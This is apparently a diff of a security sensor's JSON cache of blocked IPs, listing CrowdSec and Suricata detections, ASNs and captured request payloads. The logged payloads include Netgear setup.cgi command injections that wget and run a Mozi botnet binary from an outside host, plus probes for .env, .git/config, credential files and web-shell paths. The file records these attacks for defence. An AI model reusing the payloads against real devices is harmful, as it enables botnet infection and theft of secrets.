@@ -1,7 +1,7 @@
 {
   "schema_version": "2",
   "ttl_days": 7,
-  "updated_at": "2026-04-29T13:00:02.736428Z",
+  "updated_at": "2026-04-30T01:00:02.142738Z",
   "items": {
     "79.124.40.174": {
       "ip": "79.124.40.174",
@@ -45,98 +45,6 @@
       },
       "asn": "50360",
       "asn_prefix": "79.124.40.0/24"
-    },
-    "199.45.155.83": {
-      "ip": "199.45.155.83",
-      "family": "v4",
-      "first_seen": "2026-04-23T00:30:06Z",
-      "last_seen": "2026-04-23T00:30:06Z",
-      "scenarios": {
-        "crowdsec/http-bad-user-agent": {
-          "count": 1,
-          "last_seen": "2026-04-23T00:30:06Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-04-23T00:30:06Z",
-          "last_seen": "2026-04-23T00:30:06Z",
-          "last_alert_id": 5957,
-          "last_alert_uuid": "0b00866f-8044-4de8-8d89-ef3958bcc467"
-        }
-      },
-      "asn": "398722",
-      "asn_prefix": "199.45.155.0/24"
-    },
-    "199.45.154.157": {
-      "ip": "199.45.154.157",
-      "family": "v4",
-      "first_seen": "2026-04-22T23:44:07Z",
-      "last_seen": "2026-04-22T23:44:07Z",
-      "scenarios": {
-        "crowdsec/http-bad-user-agent": {
-          "count": 1,
-          "last_seen": "2026-04-22T23:44:07Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-04-22T23:44:07Z",
-          "last_seen": "2026-04-22T23:44:07Z",
-          "last_alert_id": 5956,
-          "last_alert_uuid": "fc31ba5c-55ce-4d5d-9769-03bfc1b66f80"
-        }
-      },
-      "asn": "398722",
-      "asn_prefix": "199.45.154.0/24"
-    },
-    "199.45.154.123": {
-      "ip": "199.45.154.123",
-      "family": "v4",
-      "first_seen": "2026-04-22T22:59:21Z",
-      "last_seen": "2026-04-22T22:59:21Z",
-      "scenarios": {
-        "crowdsec/http-bad-user-agent": {
-          "count": 1,
-          "last_seen": "2026-04-22T22:59:21Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-04-22T22:59:21Z",
-          "last_seen": "2026-04-22T22:59:21Z",
-          "last_alert_id": 5955,
-          "last_alert_uuid": "10bd86d0-d986-47e4-862f-f0087390dc7f"
-        }
-      },
-      "asn": "398722",
-      "asn_prefix": "199.45.154.0/24"
-    },
-    "199.45.154.125": {
-      "ip": "199.45.154.125",
-      "family": "v4",
-      "first_seen": "2026-04-22T22:05:47Z",
-      "last_seen": "2026-04-22T22:05:47Z",
-      "scenarios": {
-        "crowdsec/http-bad-user-agent": {
-          "count": 1,
-          "last_seen": "2026-04-22T22:05:47Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-04-22T22:05:47Z",
-          "last_seen": "2026-04-22T22:05:47Z",
-          "last_alert_id": 5953,
-          "last_alert_uuid": "93b4b58e-a441-4606-ac29-e0c16289822c"
-        }
-      },
-      "asn": "398722",
-      "asn_prefix": "199.45.154.0/24"
     },
     "20.65.219.43": {
       "ip": "20.65.219.43",
@@ -1512,7 +1420,9 @@
             "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
           ]
         }
-      }
+      },
+      "asn": "59257",
+      "asn_prefix": "223.123.72.0/24"
     },
     "103.237.157.160": {
       "ip": "103.237.157.160",
@@ -1556,7 +1466,9 @@
             "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
           ]
         }
-      }
+      },
+      "asn": "132934",
+      "asn_prefix": "103.237.156.0/22"
     },
     "88.151.33.51": {
       "ip": "88.151.33.51",
@@ -1594,7 +1506,9 @@
             "GET /serviceAccountKey.json"
           ]
         }
-      }
+      },
+      "asn": "41608",
+      "asn_prefix": "88.151.32.0/22"
     },
     "94.26.106.206": {
       "ip": "94.26.106.206",
@@ -1617,7 +1531,9 @@
           ],
           "max_priority": 2
         }
-      }
+      },
+      "asn": "215607",
+      "asn_prefix": "94.26.106.0/24"
     },
     "40.124.175.233": {
       "ip": "40.124.175.233",
@@ -1643,7 +1559,9 @@
             "GET /hudson"
           ]
         }
-      }
+      },
+      "asn": "8075",
+      "asn_prefix": "40.124.0.0/16"
     },
     "45.33.12.122": {
       "ip": "45.33.12.122",
@@ -1669,7 +1587,9 @@
             "GET /"
           ]
         }
-      }
+      },
+      "asn": "63949",
+      "asn_prefix": "45.33.0.0/19"
     },
     "172.189.127.8": {
       "ip": "172.189.127.8",
@@ -1695,7 +1615,9 @@
             "GET /c/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.350.0_270f20341093f21f716d3b9044eb34ed38ecc8a0.exe?cacheHostOrigin=2.au.download.windowsupdate.com"
           ]
         }
-      }
+      },
+      "asn": "8075",
+      "asn_prefix": "172.160.0.0/11"
     },
     "185.243.5.246": {
       "ip": "185.243.5.246",
@@ -1718,7 +1640,9 @@
           ],
           "max_priority": 1
         }
-      }
+      },
+      "asn": "23470",
+      "asn_prefix": "185.243.5.0/24"
     },
     "40.124.174.148": {
       "ip": "40.124.174.148",
@@ -1744,7 +1668,9 @@
             "GET /"
           ]
         }
-      }
+      },
+      "asn": "8075",
+      "asn_prefix": "40.124.0.0/16"
     },
     "152.32.255.94": {
       "ip": "152.32.255.94",
@@ -1769,6 +1695,227 @@
           "payloads": [
             "\u00033.\\xe0Cookie: mstshash=Administrator"
           ]
+        }
+      },
+      "asn": "135377",
+      "asn_prefix": "152.32.255.0/24"
+    },
+    "65.1.2.171": {
+      "ip": "65.1.2.171",
+      "family": "v4",
+      "first_seen": "2026-04-30T00:46:09Z",
+      "last_seen": "2026-04-30T00:46:27Z",
+      "scenarios": {
+        "crowdsec/http-admin-interface-probing": {
+          "count": 1,
+          "last_seen": "2026-04-30T00:46:27Z"
+        },
+        "crowdsec/http-probing": {
+          "count": 1,
+          "last_seen": "2026-04-30T00:46:10Z"
+        },
+        "crowdsec/http-sensitive-files": {
+          "count": 1,
+          "last_seen": "2026-04-30T00:46:09Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 3,
+          "first_seen": "2026-04-30T00:46:09Z",
+          "last_seen": "2026-04-30T00:46:27Z",
+          "last_alert_id": 6111,
+          "last_alert_uuid": "b44ad83b-caa4-49c9-baae-1f1a39b6d39f",
+          "payloads": [
+            "GET /administrator/.env",
+            "GET /phpinfo.php",
+            "GET /phpinfo",
+            "GET /",
+            "GET /.git/config",
+            "GET /.env",
+            "GET /.env.local",
+            "GET /.env.production",
+            "GET /.env.staging",
+            "GET /.env.development",
+            "GET /.env.test",
+            "GET /.env.remote",
+            "GET /.env.bak",
+            "GET /.env.backup"
+          ]
+        }
+      }
+    },
+    "66.132.195.46": {
+      "ip": "66.132.195.46",
+      "family": "v4",
+      "first_seen": "2026-04-29T22:56:59Z",
+      "last_seen": "2026-04-29T22:56:59Z",
+      "scenarios": {
+        "crowdsec/http-bad-user-agent": {
+          "count": 1,
+          "last_seen": "2026-04-29T22:56:59Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 1,
+          "first_seen": "2026-04-29T22:56:59Z",
+          "last_seen": "2026-04-29T22:56:59Z",
+          "last_alert_id": 6107,
+          "last_alert_uuid": "8064cb8a-70db-4c16-82e6-cab18e1e757e",
+          "payloads": [
+            "GET /debug/pprof/",
+            "GET /metrics"
+          ]
+        }
+      }
+    },
+    "158.158.98.94": {
+      "ip": "158.158.98.94",
+      "family": "v4",
+      "first_seen": "2026-04-29T15:06:42Z",
+      "last_seen": "2026-04-29T21:56:13Z",
+      "scenarios": {
+        "crowdsec/http-probing": {
+          "count": 2,
+          "last_seen": "2026-04-29T21:56:13Z"
+        },
+        "crowdsec/http-admin-interface-probing": {
+          "count": 1,
+          "last_seen": "2026-04-29T15:06:42Z"
+        },
+        "crowdsec/http-backdoors-attempts": {
+          "count": 1,
+          "last_seen": "2026-04-29T15:06:42Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 4,
+          "first_seen": "2026-04-29T15:06:42Z",
+          "last_seen": "2026-04-29T21:56:13Z",
+          "last_alert_id": 6105,
+          "last_alert_uuid": "b6a22357-fcd6-4cf6-bccd-c025cfceda03",
+          "payloads": [
+            "GET /images/index.php",
+            "GET /index.php",
+            "GET /index/function.php",
+            "GET /install.php",
+            "GET /ioxi-o.php",
+            "GET /k.php",
+            "GET /lock360.php",
+            "GET /meta.php",
+            "GET /admin.php",
+            "GET /admin/controller/extension/",
+            "GET /adminfuns.php",
+            "GET /xleet.php",
+            "GET /xmrlpc.php",
+            "GET /1.php",
+            "GET /2.php",
+            "GET /a.php",
+            "GET /aa.php",
+            "GET /aaa.php",
+            "GET /abcd.php",
+            "GET /about.php"
+          ]
+        }
+      }
+    },
+    "103.203.57.3": {
+      "ip": "103.203.57.3",
+      "family": "v4",
+      "first_seen": "2026-04-29T16:38:14Z",
+      "last_seen": "2026-04-29T16:38:14Z",
+      "scenarios": {
+        "suricata/ET SCAN Zmap User-Agent (Inbound)": {
+          "count": 1,
+          "last_seen": "2026-04-29T16:38:14Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-04-29T16:38:14Z",
+          "last_seen": "2026-04-29T16:38:14Z",
+          "sids": [
+            2029054
+          ],
+          "max_priority": 3,
+          "payloads": [
+            "GET /"
+          ]
+        }
+      }
+    },
+    "194.165.16.161": {
+      "ip": "194.165.16.161",
+      "family": "v4",
+      "first_seen": "2026-04-29T14:15:08Z",
+      "last_seen": "2026-04-29T14:15:08Z",
+      "scenarios": {
+        "suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port": {
+          "count": 1,
+          "last_seen": "2026-04-29T14:15:08Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-04-29T14:15:08Z",
+          "last_seen": "2026-04-29T14:15:08Z",
+          "sids": [
+            2023753
+          ],
+          "max_priority": 2
+        }
+      }
+    },
+    "172.189.127.21": {
+      "ip": "172.189.127.21",
+      "family": "v4",
+      "first_seen": "2026-04-29T13:25:31Z",
+      "last_seen": "2026-04-29T13:25:31Z",
+      "scenarios": {
+        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response": {
+          "count": 1,
+          "last_seen": "2026-04-29T13:25:31Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-04-29T13:25:31Z",
+          "last_seen": "2026-04-29T13:25:31Z",
+          "sids": [
+            2021076
+          ],
+          "max_priority": 2,
+          "payloads": [
+            "GET /d/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.354.0_49c25323a3db617ec56479eafb168cccdfa7eb2e.exe?cacheHostOrigin=au.download.windowsupdate.com"
+          ]
+        }
+      }
+    },
+    "89.32.41.145": {
+      "ip": "89.32.41.145",
+      "family": "v4",
+      "first_seen": "2026-04-29T23:39:27Z",
+      "last_seen": "2026-04-29T23:39:27Z",
+      "scenarios": {
+        "suricata/SURICATA HTTP unable to match response to request": {
+          "count": 1,
+          "last_seen": "2026-04-29T23:39:27Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-04-29T23:39:27Z",
+          "last_seen": "2026-04-29T23:39:27Z",
+          "sids": [
+            2221010
+          ],
+          "max_priority": 3
         }
       }
     }
@@ -1805,6 +1952,12 @@
     "142647": "NAN-AS-AP Nasstec Airnet Networks Private Limited",
     "34534": "BULLIONET FBW NETWORKS SAS",
     "51852": "PLI-AS Private Layer INC",
-    "205759": "GHOSTYNETWORKS Ghosty Networks LLC"
+    "205759": "GHOSTYNETWORKS Ghosty Networks LLC",
+    "132934": "SKYMAX-AS Skymax Broadband Services Pvt. Ltd.",
+    "215607": "DF-Transit dataforest GmbH",
+    "23470": "RELIABLESITE - ReliableSite.Net LLC",
+    "41608": "NextGenWebs-NL NextGenWebs, S.L.",
+    "59257": "CMPAKLIMITED-AS-AP CMPak Limited",
+    "63949": "AKAMAI-LINODE-AP Akamai Connected Cloud"
   }
 }
